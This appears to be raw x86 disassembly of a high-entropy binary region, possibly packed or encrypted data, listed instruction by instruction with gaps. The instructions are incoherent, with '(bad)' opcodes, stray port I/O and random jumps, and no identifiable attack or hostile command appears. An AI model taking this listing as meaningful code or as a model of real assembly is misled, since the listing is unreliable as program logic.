  424344:	fdiv   QWORD PTR [ebx]
  424346:	clc    
  424347:	xor    DWORD PTR [edx+0x71cc7ac7],eax
  42434d:	inc    edx
  42434e:	out    dx,al
  42434f:	test   al,0xf3
  424351:	outs   dx,BYTE PTR ds:[esi]
  424352:	push   esi
  424353:	in     eax,dx
  424354:	ret    0x7a14
  424357:	pop    esi
  424358:	hlt    
  424359:	adc    BYTE PTR [edi+0x57],cl
  42435c:	fucom  st(2)
  42435e:	cmp    bl,dl
  424360:	sub    eax,0x2606c8e0
  424365:	cmc    
  424366:	stos   DWORD PTR es:[edi],eax
  424367:	out    0x16,eax
  424369:	jae    0x4243a4
  42436b:	add    al,0x87
  42436d:	dec    ebx
  42436e:	mov    ds:0x418f0056,eax
  424373:	pusha  
  424374:	stc    
  424375:	les    ecx,FWORD PTR [ebp+0x56f99a51]
  42437b:	popf   
  42437c:	ja     0x424383
  42437e:	inc    ecx
  42437f:	jns    0x424344
  424381:	sahf   
  424382:	or     eax,0xd94b7675
  424387:	push   ds
  424388:	pop    eax
  424389:	xchg   edi,eax
  42438a:	xchg   ebp,eax
  42438b:	lods   eax,DWORD PTR ds:[esi]
  42438c:	not    DWORD PTR [ebx+0x10]
  42438f:	ja     0x424320
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243b7
  424401:	jb     0x424440
  424403:	xchg   ecx,eax
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0xc7000001
  42440d:	sub    esp,DWORD PTR [eax]
  42440f:	std    
  424410:	xchg   ebx,eax
  424411:	outs   dx,DWORD PTR ds:[esi]
  424412:	mov    edi,0x31c16101
  424417:	shl    DWORD PTR [edx*8+0x5454bace],1
  42441e:	inc    esp
  42441f:	pop    es
  424420:	jmp    0x424490
  424422:	jno    0x42445e
  424424:	inc    esi
  424425:	xchg   ah,dh
  424427:	in     eax,0x52
  424429:	lods   eax,DWORD PTR ds:[esi]
  42442a:	inc    ecx
  42442b:	std    
  42442c:	ja     0x424487
  42442e:	jbe    0x424439
  424430:	xor    DWORD PTR [edi-0x14],0xc768db6f
  424437:	ss mov dl,cl
  42443a:	lods   al,BYTE PTR ds:[esi]
  42443b:	fldcw  WORD PTR [edx+0x74]
  42443e:	in     al,0x58
  424440:	scas   eax,DWORD PTR es:[edi]
  424441:	or     esp,DWORD PTR [ecx+0x1bb68243]
  424447:	xor    BYTE PTR [eax],dh
  424449:	jno    0x4243da
  42444b:	and    al,BYTE PTR [ecx+0x5f]
  42444e:	lods   al,BYTE PTR ds:[esi]
  42444f:	dec    edx
  424450:	mov    al,ds:0xb3f4e157
  424455:	mov    esi,0xb4bf57f
  42445a:	daa    
  42445b:	repz pop ds
  42445d:	inc    ebx
  42445e:	mov    bh,0x7d
  424460:	dec    esp
  424461:	xchg   esp,eax
  424462:	xchg   esp,ecx
  424464:	inc    edi
  424465:	push   edx
  424466:	add    dh,BYTE PTR [esp+edx*8+0x3c]
  42446a:	outs   dx,BYTE PTR ds:[esi]
  42446b:	adc    cl,BYTE PTR [edx+edi*1+0x5f]
  42446f:	dec    eax
  424470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424471:	aas    
  424472:	dec    esp
  424473:	pop    esi
  424474:	dec    ecx
  424475:	jnp    0x42440f
  424477:	mov    ch,0xd2
  424479:	aas    
  42447a:	push   eax
  42447b:	xor    cl,BYTE PTR [esi+0x3c0d57c8]
  424481:	mov    ebp,DWORD PTR [ebx+0x54c04ac9]
  424487:	dec    edx
  424488:	jb     0x4244dc
  42448a:	dec    ebx
  42448b:	jo     0x424491
  42448d:	test   DWORD PTR [edx-0x9277f89],0xb65f3eff
  424497:	push   0x4e
  424499:	iret   
  42449a:	pop    edi
  42449b:	push   es
  42449c:	xchg   esi,eax
  42449d:	push   edi
  42449e:	cmp    dl,BYTE PTR [esi+esi*2]
  4244a1:	stos   DWORD PTR es:[edi],eax
  4244a2:	aad    0xed
  4244a4:	in     al,0x89
  4244a6:	mov    bh,0xa
  4244a8:	or     eax,edx
  4244aa:	push   edi
  4244ab:	packsswb mm6,QWORD PTR [edi]
  4244ae:	neg    BYTE PTR [esi+0x4f]
  4244b1:	packuswb mm3,QWORD PTR [ecx-0x7e]
  4244b5:	lea    ebx,[esp+edx*4-0x78]
  4244b9:	fcom   QWORD PTR [edi+0x13]
  4244bc:	sar    ebx,1
  4244be:	mov    dl,0x5c
  4244c0:	mov    ecx,0xebea2528
  4244c5:	scas   al,BYTE PTR es:[edi]
  4244c6:	sub    al,0xee
  4244c8:	mov    ah,0x97
  4244ca:	das    
  4244cb:	cmp    ah,ah
  4244cd:	cld    
  4244ce:	push   es
  4244cf:	imul   cl
  4244d1:	mov    ah,0x66
  4244d3:	mov    esi,0x58602a10
  4244d8:	sub    BYTE PTR [esp+ebp*8+0x10],0x44
  4244dd:	inc    esi
  4244de:	add    al,0x43
  4244e0:	fadd   st(0),st
  4244e2:	push   edx
  4244e3:	lods   al,BYTE PTR ds:[esi]
  4244e4:	inc    ecx
  4244e5:	xchg   edx,eax
  4244e6:	cmp    BYTE PTR ds:0x938f3baa,al
  4244ec:	mov    edx,0x57f954c0
  4244f1:	and    eax,0x7b166844
  4244f6:	cmp    edx,esi
  4244f8:	mov    edi,0xf5a64cce
  4244fd:	mov    dl,0xce
  4244ff:	fstp   TBYTE PTR [edx]
  424501:	aas    
  424502:	inc    esi
  424503:	sbb    cl,BYTE PTR [edi+0x27]
  424506:	inc    edx
  424507:	sbb    al,0xd2
  424509:	jle    0x424555
  42450b:	adc    eax,0xfe2117db
  424510:	mov    ecx,0x0
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x6f],1
  424581:	outs   dx,BYTE PTR ds:[esi]
  424582:	fisttp QWORD PTR [ebp+0x47]
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0x7f000001,al
  42458d:	dec    esp
  42458e:	inc    eax
  42458f:	cdq    
  424590:	rcl    al,cl
  424592:	sub    al,0xac
  424594:	sbb    dl,dh
  424596:	xchg   esi,eax
  424597:	adc    bl,BYTE PTR [ebx+0x6c]
  42459a:	mov    esp,0x79e3f3cc
  42459f:	push   es
  4245a0:	push   ebx
  4245a1:	or     DWORD PTR [ebx+0x5f],ebx
  4245a4:	pushf  
  4245a5:	push   es
  4245a6:	pop    ebp
  4245a7:	push   ebp
  4245a8:	xchg   eax,esi
  4245aa:	into   
  4245ab:	mov    esi,0xb159e4ba
  4245b0:	pop    esp
  4245b1:	(bad)  
  4245b2:	sub    al,0xd2
  4245b4:	cld    
  4245b5:	pop    eax
  4245b6:	push   0xfed35d4b
  4245bb:	sub    dl,BYTE PTR [edx-0x1f609b5]
  4245c1:	pushf  
  4245c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245c3:	inc    edi
  4245c4:	inc    ecx
  4245c5:	inc    esp
  4245c6:	push   eax
  4245c7:	in     al,0xb0
  4245c9:	or     al,0xb4
  4245cb:	retf   
  4245cc:	pop    ebp
  4245cd:	fs mov esi,0x7a7f092
  4245d3:	cmp    ecx,esp
  4245d5:	(bad)  
  4245d6:	pop    ebp
  4245d7:	xchg   BYTE PTR es:[esi-0x7a],bh
  4245db:	jle    0x4245db
  4245dd:	ror    DWORD PTR [edx-0x3c],1
  4245e0:	push   0x42
  4245e2:	push   ds
  4245e3:	das    
  4245e4:	xor    BYTE PTR [ebx-0x1dec8bd4],ah
  4245ea:	repnz aas 
  4245ec:	(bad)  [ecx+0x2f0a38db]
  4245f2:	add    DWORD PTR ds:0x67d997c,ecx
  4245f8:	test   eax,0x61304faa
  4245fd:	add    al,0xbb
  4245ff:	push   eax
  424600:	(bad)  [esi+0x3]
  424603:	xor    BYTE PTR [ebx],0x20
  424606:	jno    0x4245ac
  424608:	pop    esp
  424609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42460a:	into   
  42460b:	sub    dl,dl
  42460d:	popf   
  42460e:	retf   
  42460f:	or     DWORD PTR [edx],ebx
  424611:	mov    dl,0x9b
  424613:	push   ebx
  424614:	jecxz  0x4245f5
  424616:	outs   dx,DWORD PTR ds:[esi]
  424617:	push   cs
  424618:	mov    ds:0xb0ca6009,eax
  42461d:	xor    ah,BYTE PTR [ecx+0x7d]
  424620:	outs   dx,BYTE PTR ds:[si]
  424622:	cmp    eax,0x2f666daa
  424627:	jne    0x424664
  424629:	stc    
  42462a:	push   0xffffffd1
  42462c:	pop    ebp
  42462d:	mov    dh,ah
  42462f:	sub    dh,ch
  424631:	fstp   QWORD PTR [eax]
  424633:	pushf  
  424634:	inc    edi
  424635:	ss pop ds
  424637:	pusha  
  424638:	xor    al,0x50
  42463a:	int3   
  42463b:	ret    
  42463c:	in     eax,0x5f
  42463e:	out    0xf5,al
  424640:	mov    edi,0xa7cdb984
  424645:	lods   eax,DWORD PTR ds:[esi]
  424646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424647:	dec    ecx
  424648:	sbb    ebp,DWORD PTR [ecx]
  42464a:	dec    esp
  42464b:	popf   
  42464c:	in     al,0xd2
  42464e:	lds    ebp,FWORD PTR [esi-0x328fbc72]
  424654:	cdq    
  424655:	out    0x29,al
  424657:	out    0x5a,al
  424659:	mov    ah,0xfd
  42465b:	jns    0x42460d
  42465d:	pop    ds
  42465e:	clc    
  42465f:	fst    QWORD PTR [edx+ebp*2-0x77166bb9]
  424666:	mov    dl,dl
  424668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424669:	inc    ecx
  42466a:	and    al,BYTE PTR [edx+0x7090a0a9]
  424670:	jge    0x42463d
  424672:	lahf   
  424673:	or     al,0x42
  424675:	enter  0x7707,0x66
  424679:	loopne 0x42468e
  42467b:	xchg   ecx,eax
  42467c:	sub    edi,edx
  42467e:	dec    DWORD PTR [edx-0x64638e10]
  424684:	cld    
  424685:	xlat   BYTE PTR ds:[ebx]
  424686:	(bad)  
  424688:	int    0x91
  42468a:	bound  ebx,QWORD PTR [ecx+0x34]
  42468d:	ror    BYTE PTR [ecx+esi*1+0x7b],1
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ecx+0x4c949bf4],al
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0xb9000001,al
  42470d:	sahf   
  42470e:	inc    ecx
  42470f:	mov    cl,0x1a
  424711:	mov    DWORD PTR [edi],esp
  424713:	fiadd  DWORD PTR [eax+0x77]
  424716:	(bad)  
  424718:	xchg   edx,eax
  424719:	jmp    0x424716
  42471b:	icebp  
  42471c:	jnp    0x424784
  42471e:	mov    esi,0x14bf4036
  424723:	mov    edi,0x25c6464e
  424728:	xor    DWORD PTR [edx+0x39],ebx
  42472b:	inc    eax
  42472c:	jo     0x4246b5
  42472e:	add    DWORD PTR [ebx],esp
  424730:	(bad)  
  424731:	loopne 0x424739
  424733:	cmp    BYTE PTR [edx+0x2a95d2ac],dh
  424739:	jmp    0x424779
  42473b:	inc    esp
  42473c:	xchg   bl,dh
  42473e:	cmp    al,BYTE PTR [esi+0x1ce5451a]
  424744:	test   eax,0x858b9dc
  424749:	fcom   QWORD PTR [eax+ebx*8+0x2c]
  42474d:	(bad)  
  42474e:	jmp    0x89c6c9e5
  424753:	hlt    
  424754:	mov    ecx,ebx
  424756:	xchg   ebx,eax
  424757:	rcr    BYTE PTR [ecx],cl
  424759:	outs   dx,DWORD PTR ds:[esi]
  42475a:	sub    ebp,DWORD PTR [edx+eax*2]
  42475d:	or     DWORD PTR [edx+0x48556721],ebx
  424763:	outs   dx,BYTE PTR ds:[esi]
  424764:	cmc    
  424765:	retf   
  424766:	clc    
  424767:	cdq    
  424768:	pop    edx
  424769:	imul   esp,esi,0x1c
  42476c:	push   eax
  42476d:	fnsave [esi+0x5cd621cf]
  424773:	push   0x98304075
  424778:	jbe    0x424739
  42477a:	jno    0x4247ad
  42477c:	push   ebx
  42477d:	into   
  42477e:	xor    ecx,DWORD PTR [ebx+0x426d6cfd]
  424784:	mov    BYTE PTR [eax+eiz*2-0x58],0x55
  424789:	jl     0x4247db
  42478b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42478c:	mov    eax,0x6e7c0fa
  424791:	daa    
  424792:	(bad)  
  424793:	ja     0x4247d9
  424795:	or     esp,DWORD PTR [ecx-0x49]
  424798:	sbb    al,0xa1
  42479a:	sbb    BYTE PTR [edi+0x10],bh
  42479d:	xchg   ebp,edx
  42479f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247a0:	and    eax,0x4faf0e14
  4247a5:	mov    ds:0x137e111,eax
  4247aa:	or     al,0x22
  4247ac:	retf   
  4247ad:	in     eax,dx
  4247ae:	mov    al,ds:0x4b3bdce9
  4247b3:	sub    al,0x37
  4247b5:	push   ds
  4247b6:	(bad)  
  4247b7:	js     0x4247df
  4247b9:	ffree  st(5)
  4247bb:	xor    al,0x9
  4247bd:	popa   
  4247be:	(bad)  
  4247bf:	xor    dl,BYTE PTR [ebx]
  4247c1:	inc    edx
  4247c2:	jno    0x4247db
  4247c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247c5:	sub    dh,al
  4247c7:	jl     0x42478d
  4247c9:	add    bl,BYTE PTR [esi-0x63]
  4247cc:	bound  edx,QWORD PTR [edx]
  4247ce:	shr    DWORD PTR [edi],0x12
  4247d1:	pop    ss
  4247d2:	mov    dh,0xd9
  4247d4:	(bad)  [ebx]
  4247d6:	mov    ds:0x75df4d45,al
  4247db:	xlat   BYTE PTR ds:[ebx]
  4247dc:	sub    dl,cl
  4247de:	mov    dl,0xfb
  4247e0:	aas    
  4247e1:	sub    BYTE PTR [ebp+eiz*2-0x5c753592],cl
  4247e8:	jmp    0xc515dd21
  4247ed:	add    BYTE PTR [ecx+0x7bf48a28],cl
  4247f3:	inc    esi
  4247f4:	dec    ebx
  4247f5:	pop    esi
  4247f6:	mov    esi,0x42f270d
  4247fb:	lock outs dx,BYTE PTR ds:[esi]
  4247fd:	sti    
  4247fe:	ret    0x7f84
  424801:	retf   
  424802:	adc    al,0x4
  424804:	sbb    esp,DWORD PTR [ecx-0x45]
  424807:	sar    DWORD PTR [esi],cl
  424809:	add    ax,0x5cb9
  42480d:	xor    BYTE PTR [edx],0x5e
  424810:	xor    eax,DWORD PTR [eax]
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	pop    esi
  424881:	pop    edi
  424882:	das    
  424883:	stos   DWORD PTR es:[edi],eax
  424884:	push   ecx
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0x64000001,al
  42488d:	or     ah,BYTE PTR [eax-0x4915e95b]
  424893:	sub    al,0x51
  424895:	in     al,0xb8
  424897:	fs dec esi
  424899:	mov    edx,0xe054246f
  42489e:	push   ecx
  42489f:	pop    ss
  4248a0:	imul   eax,DWORD PTR [esi-0x30],0x7b
  4248a4:	(bad)  
  4248a6:	sbb    eax,esi
  4248a8:	add    DWORD PTR [ebp-0x34],ecx
  4248ab:	pop    ss
  4248ac:	xchg   ebp,eax
  4248ad:	mov    bh,BYTE PTR [esi+0x7204f520]
  4248b3:	test   BYTE PTR [edx+0x33],ah
  4248b6:	repz mov al,ds:0x9d7186ea
  4248bc:	or     BYTE PTR [edx-0x6c],bl
  4248bf:	jge    0x42488c
  4248c1:	cs jge 0x4248b1
  4248c4:	pusha  
  4248c5:	fnstcw WORD PTR [ecx-0x5f]
  4248c8:	inc    ecx
  4248c9:	inc    ecx
  4248ca:	test   eax,0xaaa96624
  4248cf:	cmp    DWORD PTR [eax],esp
  4248d1:	or     cl,BYTE PTR [ecx+0x7b9faa64]
  4248d7:	jl     0x42488d
  4248d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248da:	jne    0x424898
  4248dc:	dec    esi
  4248dd:	sub    al,0xb7
  4248df:	aad    0xdd
  4248e1:	jnp    0x424948
  4248e3:	mov    ds:0x3f81746a,eax
  4248e8:	ror    DWORD PTR [edx+ebx*4+0xe43cddd],1
  4248ef:	adc    al,BYTE PTR [ebx]
  4248f1:	ss out dx,eax
  4248f3:	inc    edi
  4248f4:	mov    edi,0x330e43e7
  4248f9:	ja     0x4248d9
  4248fb:	not    DWORD PTR [edi-0x64]
  4248fe:	fimul  WORD PTR [edx+0x44879512]
  424904:	loop   0x424941
  424906:	and    eax,DWORD PTR [ecx-0x12]
  424909:	lahf   
  42490a:	jae    0x42490c
  42490c:	mov    bh,0x74
  42490e:	mov    cs,WORD PTR [ebx]
  424910:	push   ebx
  424911:	sbb    DWORD PTR [ebp-0x31],ecx
  424914:	bnd jb 0x4248b7
  424917:	test   al,0x4d
  424919:	cmc    
  42491a:	or     al,0xb0
  42491c:	xor    bl,BYTE PTR [esi+ebp*8-0xb]
  424920:	mov    edi,0x67be03be
  424925:	xchg   ebx,eax
  424926:	ret    0x83ad
  424929:	or     dl,BYTE PTR [edx]
  42492b:	mov    ds:0x10fb6fe6,al
  424930:	push   eax
  424931:	cld    
  424932:	dec    edx
  424933:	imul   DWORD PTR [ebp-0x7a4cd013]
  424939:	and    eax,0xda1b7442
  42493e:	inc    ebp
  42493f:	pushf  
  424940:	sbb    al,0xf7
  424942:	scas   al,BYTE PTR es:[edi]
  424943:	hlt    
  424944:	ja     0x424950
  424946:	(bad)  
  424947:	into   
  424948:	into   
  424949:	dec    esp
  42494a:	and    esp,DWORD PTR [ebx+0x73]
  42494d:	jmp    0x856a:0x4071a866
  424954:	add    ecx,edx
  424956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424957:	mov    ebp,0xae3eb711
  42495c:	jge    0x4248e6
  42495e:	push   ebp
  42495f:	mov    bl,0x67
  424961:	mov    eax,0xf222a03d
  424966:	scas   al,BYTE PTR es:[edi]
  424967:	mov    bh,0xa
  424969:	jle    0x424900
  42496b:	mov    ds:0xb2d17cda,al
  424970:	mov    ah,0x85
  424972:	test   DWORD PTR ds:0x85eef450,ecx
  424978:	push   ds
  424979:	dec    edi
  42497a:	xor    ecx,DWORD PTR [ebx-0x57]
  42497d:	xor    DWORD PTR [edi-0x4d],0x558a6ed9
  424984:	adc    DWORD PTR [esi+0x47b897bc],0xd898f35f
  42498e:	mov    WORD PTR [eax],gs
  424990:	dec    edi
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    cl,BYTE PTR [edx+0x56d33a79]
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0xb3000001,al
  424a0d:	and    ebp,ecx
  424a0f:	out    0x19,al
  424a11:	lods   eax,DWORD PTR ds:[esi]
  424a12:	(bad)  
  424a13:	sti    
  424a14:	jbe    0x424a00
  424a16:	jmp    0x4249a3
  424a18:	idiv   WORD PTR [eax+0x1b7922fa]
  424a1f:	adc    ah,BYTE PTR [ecx]
  424a21:	adc    bl,bl
  424a23:	adc    ebp,DWORD PTR [ebx+eax*2]
  424a26:	fiadd  DWORD PTR [ecx-0x567dcfea]
  424a2c:	(bad)  
  424a2f:	jns    0x424a7f
  424a31:	(bad)  
  424a32:	fidiv  WORD PTR [ebx-0x37372fe7]
  424a38:	push   ds
  424a39:	in     al,0xbb
  424a3b:	adc    edi,esi
  424a3d:	pop    esp
  424a3e:	mov    eax,0x2baca097
  424a43:	sbb    ebp,DWORD PTR [edi+eiz*2]
  424a46:	fcomp  QWORD PTR [ebx+0x2ff694a]
  424a4c:	mov    al,0x9e
  424a4e:	pop    esi
  424a4f:	pop    esp
  424a50:	sbb    al,0x25
  424a52:	sbb    bl,BYTE PTR [eax]
  424a54:	xchg   ebx,eax
  424a55:	jle    0x4249ef
  424a57:	sar    edx,0x4a
  424a5a:	xor    dl,ch
  424a5c:	aam    0xc4
  424a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a5f:	dec    ebp
  424a60:	aas    
  424a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a62:	jmp    0x424a9f
  424a64:	ret    0xed0c
  424a67:	or     eax,0xb45feb09
  424a6c:	mov    bh,0x27
  424a6e:	ret    0x928b
  424a71:	ror    BYTE PTR [eax-0x3394dbe0],0x16
  424a78:	mov    eax,ds:0x5c56d358
  424a7d:	loop   0x424a0a
  424a7f:	in     eax,dx
  424a80:	lock xchg ebx,eax
  424a82:	sbb    eax,0x322d2c33
  424a87:	pusha  
  424a88:	pop    esp
  424a89:	cmp    al,0x57
  424a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a8c:	loope  0x424aad
  424a8e:	jmp    0x424a86
  424a90:	xor    BYTE PTR [edx-0x64],ch
  424a93:	fisttp QWORD PTR [ebp-0x30]
  424a96:	jb     0x424b10
  424a98:	mov    edx,0x30146f2c
  424a9d:	aaa    
  424a9e:	mov    cl,0x17
  424aa0:	dec    edx
  424aa1:	xchg   ecx,eax
  424aa2:	dec    ebp
  424aa3:	push   edx
  424aa4:	xor    BYTE PTR ss:[ecx-0x16],0x9b
  424aa9:	inc    edi
  424aaa:	and    DWORD PTR [eax],edi
  424aac:	and    eax,0x325ca7be
  424ab1:	xor    DWORD PTR [edx+eax*2+0x3],esp
  424ab5:	into   
  424ab6:	loopne 0x424ab9
  424ab8:	push   eax
  424ab9:	repz enter 0x6502,0x48
  424abe:	and    eax,0xef8aa4d0
  424ac3:	and    al,0x83
  424ac5:	xor    eax,0x78df93dc
  424aca:	jo     0x424a6e
  424acc:	icebp  
  424acd:	mov    dl,0xe1
  424acf:	icebp  
  424ad0:	mov    cl,bh
  424ad2:	push   ecx
  424ad3:	sti    
  424ad4:	pop    ebx
  424ad5:	imul   edx,DWORD PTR [edi+0x6681dd0e],0xfffffff0
  424adc:	or     BYTE PTR [ecx+0x34],al
  424adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ae0:	inc    ecx
  424ae1:	sbb    DWORD PTR [ebx+0x4fc5e4bc],esp
  424ae7:	cmp    eax,0x671e9aeb
  424aec:	adc    edi,ebp
  424aee:	aaa    
  424aef:	(bad)  
  424af0:	sbb    esi,DWORD PTR [eax]
  424af2:	mov    al,0x2
  424af4:	add    eax,0x2f4313ea
  424af9:	push   cs
  424afa:	push   edi
  424afb:	add    eax,0xb4b9a61c
  424b00:	cmp    eax,0x57dedbce
  424b05:	dec    edi
  424b06:	adc    DWORD PTR [edi-0x34],edi
  424b09:	mov    bh,0x84
  424b0b:	cmp    DWORD PTR [ebx+0x52],0xffffff89
  424b0f:	or     al,0x1e
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	push   ebx
  424b81:	xor    ebp,DWORD PTR [esi+0x1885b73]
  424b87:	add    BYTE PTR ds:0xef000001,al
  424b8d:	mov    bl,0x93
  424b8f:	push   cs
  424b90:	ins    BYTE PTR es:[edi],dx
  424b91:	fdiv   DWORD PTR [edx-0x72]
  424b94:	jbe    0x424b3b
  424b96:	das    
  424b97:	scas   eax,DWORD PTR es:[edi]
  424b98:	pop    ebp
  424b99:	and    DWORD PTR [ebp-0x63dee26d],ecx
  424b9f:	leave  
  424ba0:	jmp    0x69cb:0x6b4c5ac9
  424ba7:	sbb    esi,DWORD PTR [esi-0x3d878381]
  424bad:	sbb    bl,BYTE PTR fs:[edx-0x40870932]
  424bb4:	mov    dh,0x2f
  424bb6:	xlat   BYTE PTR ds:[ebx]
  424bb7:	cmp    DWORD PTR [edx-0xeee9b0d],ebp
  424bbd:	repnz and eax,DWORD PTR [edx-0x29]
  424bc1:	mov    edi,0xd6200b87
  424bc6:	or     edi,DWORD PTR [ebp+edx*4-0x4c1f19a6]
  424bcd:	and    DWORD PTR [esi-0x65],esp
  424bd0:	aad    0x43
  424bd2:	mov    esi,0x33d8ca9
  424bd7:	or     BYTE PTR [eax+0x6ccbd932],ah
  424bdd:	mov    esi,0x481a770e
  424be2:	retf   0x9b0a
  424be5:	sti    
  424be6:	es aaa 
  424be8:	lock retf 
  424bea:	ficomp DWORD PTR [ebx-0x61]
  424bed:	sub    BYTE PTR [ebx+0x37bba70b],0x23
  424bf4:	rcl    BYTE PTR ds:0x684f8b22,0x72
  424bfb:	add    eax,0x57b11ab
  424c00:	stos   BYTE PTR es:[edi],al
  424c01:	mov    al,ds:0xdb9acd63
  424c06:	and    dl,ch
  424c08:	push   ecx
  424c09:	push   cs
  424c0a:	rcr    BYTE PTR [ebx+0x4b68c18a],cl
  424c10:	mov    edx,DWORD PTR [ecx-0x76]
  424c13:	mul    DWORD PTR [ebx]
  424c15:	add    DWORD PTR ds:0x338bc652,0x5890f57
  424c1f:	sub    bh,ah
  424c21:	in     eax,0xe7
  424c23:	ja     0x424c23
  424c25:	ror    BYTE PTR [esi],0xf0
  424c28:	pop    ss
  424c29:	pop    eax
  424c2a:	mov    WORD PTR [eax-0x6d],?
  424c2d:	pop    esi
  424c2e:	push   edi
  424c2f:	or     DWORD PTR [eax],ecx
  424c31:	or     eax,0xda52a8e6
  424c36:	ss pop ebx
  424c38:	call   0xf524:0x9e38b03
  424c3f:	cmp    ah,BYTE PTR [edi+0x7f2c40d7]
  424c45:	and    eax,esi
  424c47:	scas   eax,DWORD PTR es:[edi]
  424c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c49:	(bad)  
  424c4a:	dec    ebp
  424c4b:	scas   al,BYTE PTR es:[edi]
  424c4c:	jo     0x424c21
  424c4e:	xor    al,0xf6
  424c50:	inc    ebp
  424c51:	jl     0x424be7
  424c53:	clc    
  424c54:	mov    ds:0x7918b953,eax
  424c59:	(bad)  
  424c5b:	dec    esi
  424c5c:	sbb    eax,0x23d2a346
  424c61:	out    dx,eax
  424c62:	enter  0x313c,0xcd
  424c66:	call   0xe770:0x3ce192f
  424c6d:	lea    ebx,[ebp-0x215244ab]
  424c73:	stos   DWORD PTR es:[edi],eax
  424c74:	repnz xchg ebp,eax
  424c76:	in     al,0x1b
  424c78:	and    al,0x32
  424c7a:	pop    edi
  424c7b:	pop    ds
  424c7c:	fisttp QWORD PTR [eax+eiz*2]
  424c7f:	push   0x6fed5ddc
  424c84:	outs   dx,BYTE PTR ds:[esi]
  424c85:	mov    ecx,0x501b6133
  424c8a:	sub    al,0x45
  424c8c:	mov    eax,0x5c79bd44
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	lahf   
  424d01:	mov    edx,0x89607f9e
  424d06:	add    DWORD PTR [eax],eax
  424d08:	add    eax,0x58000001
  424d0d:	mov    edi,0xf1e5fc14
  424d12:	xchg   bh,bl
  424d14:	test   eax,0xb9d66561
  424d19:	pop    ebp
  424d1b:	loopne 0x424ccb
  424d1d:	cmp    DWORD PTR [ebx],eax
  424d1f:	mov    ah,0xcb
  424d21:	and    DWORD PTR [edi-0x5c5a06ce],edi
  424d27:	sbb    eax,0x59ba3a4b
  424d2c:	inc    edi
  424d2d:	inc    edx
  424d2e:	add    esi,DWORD PTR [ecx+ecx*4]
  424d31:	jmp    0x424cbf
  424d33:	jbe    0x424d68
  424d35:	mov    ah,0x4d
  424d37:	lods   eax,DWORD PTR ds:[esi]
  424d38:	pusha  
  424d39:	xchg   esp,eax
  424d3a:	call   0x4ead:0x4f6710d7
  424d41:	sbb    al,0x86
  424d43:	sub    ch,dl
  424d45:	or     eax,0x91fe3267
  424d4a:	and    al,0xa8
  424d4c:	int    0x21
  424d4e:	popf   
  424d4f:	cmp    BYTE PTR [edx+edi*8-0x34],al
  424d53:	inc    ebp
  424d54:	xlat   BYTE PTR ds:[ebx]
  424d55:	and    DWORD PTR [esi-0x3312423a],ebx
  424d5b:	dec    DWORD PTR [edx+esi*2+0x8702f2e]
  424d62:	xchg   edi,eax
  424d63:	cmp    ch,BYTE PTR [ebx]
  424d65:	adc    al,0xb5
  424d67:	sub    eax,DWORD PTR [ecx-0x7e]
  424d6a:	test   al,0xf2
  424d6c:	pop    ss
  424d6d:	sbb    DWORD PTR [esi+0x5e],eax
  424d70:	dec    ecx
  424d71:	dec    eax
  424d72:	pop    es
  424d73:	icebp  
  424d74:	sub    al,0xd9
  424d76:	sahf   
  424d77:	rcl    DWORD PTR [edi-0x6a],cl
  424d7a:	(bad)  
  424d7b:	(bad)  
  424d7c:	dec    edx
  424d7d:	sahf   
  424d7e:	cmp    al,BYTE PTR [ebx-0x7d]
  424d81:	test   al,0x2f
